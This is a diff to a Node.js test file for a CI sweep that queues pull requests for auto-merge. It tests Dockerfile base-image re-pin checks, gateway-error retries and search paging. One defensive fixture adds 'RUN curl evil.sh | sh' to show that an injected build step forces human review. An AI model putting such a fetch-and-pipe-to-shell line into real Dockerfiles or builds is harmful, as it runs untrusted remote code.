@@ -4,7 +4,7 @@
 // Run: node --test operations/devops/t0-enqueue-sweep.test.mjs
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { declaresT0, headPushedAt, manualDequeueHold, selectT0Candidates, planNextWake, IDLE_MINUTES, hasReviewDataError } from './t0-enqueue-sweep.mjs';
+import { pageCapWarning, isTransientGatewayError, withGatewayRetry, SEARCH_PAGE_SIZE, SEARCH_MAX_PAGES, declaresT0, headPushedAt, manualDequeueHold, selectT0Candidates, planNextWake, IDLE_MINUTES, hasReviewDataError, repinTierCheck, isRepinBranch, REPIN_DOCKERFILE } from './t0-enqueue-sweep.mjs';
 
 const NOW = Date.parse('2026-11-02T12:00:00Z');
 const minsAgo = (m) => new Date(NOW - m * 60000).toISOString();
@@ -275,4 +275,103 @@ test('hasReviewDataError: all pages complete -> false', () => {
     reviews: { pageInfo: { hasPreviousPage: false } },
     comments: { pageInfo: { hasPreviousPage: false } },
   }), false);
+});
+
+// ── t/309: a docker/base-repin-* head must still be a pure base-pin bump ──
+const D1 = 'a'.repeat(64), D2 = 'b'.repeat(64);
+const fromLine = (tag, d) => `FROM ghcr.io/ai-rosetta-stone/ai-triad-base:${tag}@sha256:${d} AS runtime`;
+const dockerfile = (runtime, extra = []) => ['# syntax=docker/dockerfile:1', 'FROM node:22 AS build', 'RUN npm ci', runtime, ...extra, 'CMD ["node","server.js"]'].join('\n');
+const BEFORE = dockerfile(fromLine('2026-11-03', D1));
+const PURE_BUMP = dockerfile(fromLine('2026-11-10', D2));
+const repinPr = (over = {}) => pr({ number: 50, headRefName: 'docker/base-repin-2026-11-10-bbbbbbb', files: [REPIN_DOCKERFILE], ...over });
+
+test('repinTierCheck: a pure runtime pin bump of the only changed file is T0', () => {
+  assert.equal(repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: BEFORE, afterText: PURE_BUMP }).tier, 'T0');
+});
+
+test('repinTierCheck: a head with an extra Dockerfile line is T1 (classifyRepinTier decides)', () => {
+  const v = repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: BEFORE, afterText: dockerfile(fromLine('2026-11-10', D2), ['RUN curl evil.sh | sh']) });
+  assert.equal(v.tier, 'T1');
+  assert.match(v.reason, /line count changed/);
+});
+
+test('repinTierCheck: a pure Dockerfile bump PLUS another changed file is T1 (classifyRepinTier only sees the Dockerfile)', () => {
+  const v = repinTierCheck({ files: [REPIN_DOCKERFILE, 'scripts/x.sh'], beforeText: BEFORE, afterText: PURE_BUMP });
+  assert.equal(v.tier, 'T1');
+  assert.match(v.reason, /want only taxonomy-editor\/Dockerfile/);
+});
+
+test('repinTierCheck: unreadable Dockerfile text is T1, never T0', () => {
+  assert.equal(repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: null, afterText: PURE_BUMP }).tier, 'T1');
+});
+
+test('t/309 sweep: a re-pin PR whose head is still a pure bump enqueues', () => {
+  const { enqueue, skip } = selectT0Candidates([repinPr({ repinCheck: repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: BEFORE, afterText: PURE_BUMP }) })], NOW);
+  assert.deepEqual(enqueue.map((e) => e.number), [50]);
+  assert.equal(skip.length, 0);
+});
+
+test('t/309 sweep: a re-pin PR whose head gained an extra Dockerfile line skips with a WARN and asks for one T1 comment', () => {
+  const repinCheck = repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: BEFORE, afterText: dockerfile(fromLine('2026-11-10', D2), ['RUN echo hi']) });
+  const { enqueue, skip } = selectT0Candidates([repinPr({ repinCheck })], NOW);
+  assert.equal(enqueue.length, 0);
+  assert.match(skip[0].reason, /^WARN: docker\/base-repin-.* head is not a pure base-pin bump .*needs T1 review/);
+  assert.deepEqual(skip[0].repinComment, { headRefOid: 'abc', reason: repinCheck.reason });
+});
+
+test('t/309 sweep: a re-pin PR with no re-pin facts (fetch failed) fails closed, with no comment', () => {
+  const { enqueue, skip } = selectT0Candidates([repinPr()], NOW);
+  assert.equal(enqueue.length, 0);
+  assert.match(skip[0].reason, /could not be re-classified .*failing closed/);
+  assert.equal(skip[0].repinComment, undefined);
+});
+
+test('t/309 sweep: a non-re-pin branch is unaffected (no repinCheck needed, still enqueues)', () => {
+  const { enqueue } = selectT0Candidates([pr({ number: 51, headRefName: 'fix/t123-something', files: [REPIN_DOCKERFILE] })], NOW);
+  assert.deepEqual(enqueue.map((e) => e.number), [51]);
+});
+
+test('isRepinBranch: matches only the drift workflow prefix', () => {
+  assert.equal(isRepinBranch('docker/base-repin-2026-11-10-abc'), true);
+  assert.equal(isRepinBranch('docker/t305-repin-t0'), false);
+  assert.equal(isRepinBranch(undefined), false);
+});
+
+// ── t/316: the open-PR search timed out at GitHub's gateway (HTTP 502/504) as open PRs grew ──
+test('isTransientGatewayError: 502/503/504 are transient; 4xx, rate limits and other errors are not', () => {
+  for (const m of ['gh: HTTP 502', 'Command failed: gh api graphql ...\ngh: HTTP 504', 'HTTP 503 Service Unavailable']) assert.equal(isTransientGatewayError(m), true, m);
+  for (const m of ['gh: HTTP 401', 'HTTP 403: API rate limit exceeded for installation', 'HTTP 5020', 'GraphQL: Could not resolve to a PullRequest', '', undefined]) assert.equal(isTransientGatewayError(m), false, String(m));
+});
+
+test('withGatewayRetry: a gateway error then success returns the result, with a WARN and the backoff', () => {
+  const logs = []; const slept = []; let calls = 0;
+  const out = withGatewayRetry(() => { calls++; if (calls < 3) throw Object.assign(new Error('Command failed'), { stderr: 'gh: HTTP 504' }); return 'ok'; },
+    { delaysMs: [5, 15], sleep: (ms) => slept.push(ms), log: (m) => logs.push(m), label: 'search' });
+  assert.equal(out, 'ok');
+  assert.equal(calls, 3);
+  assert.deepEqual(slept, [5, 15]);
+  assert.match(logs[0], /^WARN: search hit a GitHub gateway error \(HTTP 504\); retrying/);
+});
+
+test('withGatewayRetry: a gateway error that outlasts the retries is rethrown (sweep still fails closed)', () => {
+  let calls = 0;
+  assert.throws(() => withGatewayRetry(() => { calls++; throw new Error('gh: HTTP 502'); }, { delaysMs: [1, 1], sleep: () => {}, log: () => {} }), /HTTP 502/);
+  assert.equal(calls, 3);
+});
+
+test('withGatewayRetry: a non-gateway error is rethrown at once, never retried', () => {
+  let calls = 0;
+  assert.throws(() => withGatewayRetry(() => { calls++; throw new Error('HTTP 403: API rate limit exceeded'); }, { delaysMs: [1, 1], sleep: () => {}, log: () => {} }), /HTTP 403/);
+  assert.equal(calls, 1);
+});
+
+test('search paging: smaller pages, same or larger reach than the old 50 x 10', () => {
+  assert.ok(SEARCH_PAGE_SIZE <= 20, 'a page heavy enough to time out at the gateway again');
+  assert.ok(SEARCH_PAGE_SIZE * SEARCH_MAX_PAGES >= 300);
+});
+
+test('pageCapWarning: WARN only when the cap is reached with results still unread', () => {
+  assert.equal(pageCapWarning(3, true), null, 'more pages but under the cap: keep reading, no WARN');
+  assert.equal(pageCapWarning(SEARCH_MAX_PAGES, false), null, 'cap reached exactly at the last page: nothing unread');
+  assert.match(pageCapWarning(SEARCH_MAX_PAGES, true), /^WARN: open-PR search stopped at its \d+-page cap \(\d+ PRs\) with more results unread/);
 });
